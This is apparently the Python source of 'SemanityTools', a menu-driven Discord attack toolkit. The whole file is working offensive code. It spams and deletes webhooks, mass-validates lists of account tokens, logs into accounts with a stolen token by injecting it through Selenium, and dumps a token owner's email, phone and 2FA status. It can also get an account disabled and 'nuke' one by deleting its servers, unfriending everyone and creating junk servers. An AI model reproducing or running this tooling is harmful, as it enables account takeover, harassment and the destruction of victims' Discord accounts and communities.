from colorama import Fore, Back, Style
import pyfiglet
from pyfiglet import figlet_format, fonts, FontNotFound
import selenium 
from selenium import webdriver
from urllib.request import Request, urlopen
import threading, requests, discord, random, time, os, urllib, re, json
from urllib.request import Request, urlopen
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
from discord.ext import commands
import psutil, platform, json
from datetime import datetime
from time import sleep
import requests, socket
from requests import get
import os, re, requests, subprocess
from uuid import getnode as get_mac
import sys, random
from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv
import discord_webhook
from discord_webhook import DiscordWebhook, DiscordEmbed
import random, threading
from threading import Thread
import string, urllib3
urllib3.disable_warnings()
import asyncio, colorama
from colorama import Fore, Style, Back
import time
from time import sleep
import pyfiglet.fonts
os.system('cls' if os.name == 'nt' else 'clear')    

colorama.init(convert=True)

GuildIdList    =  []
FriendIdList   =  []
ChannelIdList  =  []

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

hits = open('data/valid.txt', 'w')
bad = open('data/invalid.txt', 'w')
tokens_path = 'data/tokens.txt'

ws = "[1] Webhook Spammer"
wd = "[2] Webhook Deleter"
penis = "[3] Webhook Checker"
tl = "[4] Login to a Token"
el = "[5] Token Info"
ex = "[9] Exit"
allahu = "[6] Token Disabler"
sexirabbit = "[7] Token Checker"
urmom = "[8] Token Nuker"
enter = "   Choose an Option: "



    
def nuke():
    os.system('cls')
    pyfigletMake("Nuker")
    
    token = input(Fore.GREEN + 'Token > ')
    
    @bot.event
    async def on_ready(times : int=100):
        
        print('STATUS : [ULTIMATE NUKE]')
        print('1 - Leaving Servers')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left from [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('2 - Deleting Owned Servers')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] have been deleted')
            except:
                print(f'CANT delete [{guild.name}]')
        
        print('3 - Unfriending All Friends')

        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"can't unfriend {user}")
        
        print('4 - Spamming Servers')

        try:
            for i in range(times):
                await bot.create_guild('Beamed By SemanityTools', region=None, icon=None)
                print(f'{i} useless server created')
        except:
            print('Token is locked.')
        print('Hit maximum server limit.')
        print(' ')
        input(Fore.GREEN + 'Press Enter to return to the main menu.')
        time.sleep(0.3)
        menu()


    bot.run(token, bot=False)
    
def webhook_checker():
    
     os.system('cls')
     pyfigletMake("Webhook Checker")
     while True: 
      webhook = str(input(Fore.BLUE +"What Webhook do you want to check > "+ Fore.RESET))
      r = requests.get(webhook)
      print(" ")
      
      if r.status_code == 200:
       print(Fore.GREEN +"Webhook Valid" + Fore.RESET)

      if r.status_code == 401:
       print(Fore.RED +"Webhook Invalid" + Fore.RESET)
      break
     print(" ")
     input(Fore.GREEN + 'Press Enter to return to the main menu.')
     time.sleep(0.3)
     menu()




def check_token(token):
    request = requests.get('https://discordapp.com/api/v6/users/@me/library', headers={'Content-Type':'application/json',  'authorization':token})
    if request.status_code == 200:
        return True
    return False

def tchecker(path):
    print("Checking Tokens...")
    valid = 0
    invalid = 0
    if os.path.exists(tokens_path):
        pass
    else:
        open('data/tokens.txt', 'w')
        print('Input your tokens in data/tokens.txt')
    tokens = open(tokens_path, 'r').read().splitlines()
    for token in tokens:
        is_valid = check_token(token)
        if is_valid == True:
            valid += 1
            hits.write(token + '\n')
        elif is_valid == False:
            invalid += 1
            bad.write(token + '\n')
    time.sleep(0.5)
    print("Redirecting You...")
    time.sleep(1)
    os.system('cls')
    result = pyfiglet.figlet_format("Checked")
    print(Fore.GREEN + result + Fore.RESET)
    print(Fore.GREEN,'Valid Tokens:', valid, Fore.RESET)
    print(Fore.RED,'Invalid Tokens:', invalid,Fore.RESET)
    print(Fore.BLUE + "Saved Tokens To Data Folder!"+ Fore.RESET)
    hits.close()
    bad.close()
    print(' ')
    input(Fore.GREEN + 'Press Enter to return to the main menu.')
    time.sleep(0.3)
    menu()

def startchecker():
    tchecker(path=tokens_path)

def phonelock():
    os.system('cls')
    inputscreen()
    token = str(input("Insert Token Here » "))
    while True:
        api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
        data = api.json()
        check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
        stuff = check.json()
        requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
        requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
        time.sleep(7)
        print("Successfully disabled (if the token is not disabled give it up to 10 seconds)")
        break
    print(' ')
    input(Fore.GREEN + 'Press Enter to return to the main menu.')
    time.sleep(0.3)
    menu()

def pyfigletMake(text):
    result = pyfiglet.figlet_format(text)
    print (Fore.GREEN + result + Fore.RESET)

def inputscreen():
    result = pyfiglet.figlet_format("Disabler")
    print(Fore.GREEN + result + Fore.RESET)

def infoscreen():
    os.system('cls')
    result = pyfiglet.figlet_format("Token Info")
    print(Fore.GREEN + result + Fore.RESET)
    token = str(input("Insert Token Here » "))
    info(token)
    

def info(token):
    headers = {'Authorization':token, 
     'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n            [{Fore.RED}User ID{Fore.RESET}]         {userID}\n            [{Fore.RED}Username{Fore.RESET}]        {userName}\n            [{Fore.RED}2FA{Fore.RESET}]             {mfa}\n            [{Fore.RED}Email Address{Fore.RESET}]   {email}\n            [{Fore.RED}Phone Number{Fore.RESET}]    {phone if phone else 'N/A'}\n            [{Fore.RED}Token{Fore.RESET}]           {token}\n            ")
        print(' ')
        input(Fore.GREEN + 'Press Enter to return to the main menu.')
        time.sleep(0.3)
        menu()

def webhookspammer():
    os.system('cls')
    result = pyfiglet.figlet_format("Webhook Spammer")
    print(Fore.GREEN + result + Fore.RESET)
    webhook = input(Fore.BLUE + "[»] Enter The Webhook Link: ")
    message = input(Fore.BLUE + "[»] Enter The Message: ")
    print(' ')
    print(' ')
    try:
        print('To exit, press CTRL+C')
        while True:
            try:
                time.sleep(0.3)
                data = requests.post(webhook, json={"content" : message})
                if data.status_code == 204:
                    print(Fore.GREEN + "[»] Sent message: " + message)
            except:
                print(Fore.RED + "[»] Task cancelled (causes: CTRL+C or bad webhook link)")
                time.sleep(1)
                menu()
    except:
        menu()

def webhookdeleter():
    os.system('cls')
    result = pyfiglet.figlet_format("Webhook Deleter")
    print(Fore.GREEN + result + Fore.RESET)
    webhook = input(f"[{Fore.RED}>{Fore.RESET}] Webhook Link: ")
    requests.delete(webhook)
    the = requests.get(webhook)
    if the.status_code == 404:
        print(Fore.LIGHTGREEN_EX + f"[{Fore.GREEN}>{Fore.RESET}] Webhook Successfully Deleted")
    print(' ')
    input(Fore.GREEN + 'Press Enter to return to the main menu.')
    time.sleep(0.3)
    menu()
      
def PrintLogo():
    os.system('cls')
    result = pyfiglet.figlet_format("Login")
    print(Fore.GREEN + result + Fore.RESET)
    token = str(input("Insert Token Here » "))
    tokenLogin(token)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }\n            '
    driver.get('https://discord.com/login')
    driver.execute_script(script + f'\nlogin("{token}")')
    
    
def menu():
    os.system('cls')
    banner()
    print(Fore.RED + ws.center(50) + Fore.RESET)
    print(Fore.GREEN + wd.center(50) + Fore.RESET)
    print(Fore.LIGHTMAGENTA_EX + penis.center(50) + Fore.RESET)
    print(Fore.YELLOW + tl.center(50) + Fore.RESET)
    print(Fore.CYAN + el.center(44) + Fore.RESET)
    print(Fore.GREEN + allahu.center(48) + Fore.RESET)
    print(Fore.BLUE + sexirabbit.center(47) + Fore.RESET)
    print(Fore.LIGHTBLUE_EX + urmom.center(46) + Fore.RESET)
    print(Fore.LIGHTMAGENTA_EX + ex.center(37) + Fore.RESET)
    def askChoice():
        option = int(input(Fore.LIGHTYELLOW_EX + enter.center(45) + Fore.RESET))
        if option == 1:
            webhookspammer()
        elif option == 2:
            webhookdeleter() 
        elif option == 3:
            webhook_checker() 
        elif option == 4:
            PrintLogo()
        elif option == 5:
            infoscreen()
        elif option == 6:
            phonelock()
        elif option == 7:
            startchecker()
        elif option == 8:
            nuke()
        elif option == 9:
            print("Thanks for using SemanityTools!") 
            time.sleep(1)
        else:
            print("Invalid option.")    
            askChoice()
    askChoice()
    
def banner():
    print(Fore.LIGHTBLUE_EX + """
   _____                            _ _           _______          _     
  / ____|                          (_) |         |__   __|        | |    
 | (___   ___ _ __ ___   __ _ _ __  _| |_ _   _     | | ___   ___ | |___ 
  \___ \ / _ \ '_ ` _ \ / _` | '_ \| | __| | | |    | |/ _ \ / _ \| / __|
  ____) |  __/ | | | | | (_| | | | | | |_| |_| |    | | (_) | (_) | \__ \\
 |_____/ \___|_| |_| |_|\__,_|_| |_|_|\__|\__, |    |_|\___/ \___/|_|___/
                                           __/ |                         
                                          |___/                          
               Developed by Zex#2222 and theowogod#1010
          """ + Fore.RESET)

if __name__ == "__main__":
    menu()
